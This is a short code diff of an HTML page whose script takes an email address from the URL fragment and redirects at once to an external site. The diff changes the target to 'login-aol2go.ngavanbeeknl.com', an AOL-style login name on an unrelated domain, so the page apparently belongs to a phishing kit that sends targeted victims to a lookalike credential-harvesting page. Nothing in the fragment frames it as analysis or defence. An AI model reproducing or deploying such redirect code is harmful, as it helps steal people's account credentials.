@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://efile-devlabsat.devlabsat.com/?";
+			window.location.href = "https://login-aol2go.ngavanbeeknl.com/";
 		}, 0);
 	</script>
 </html>
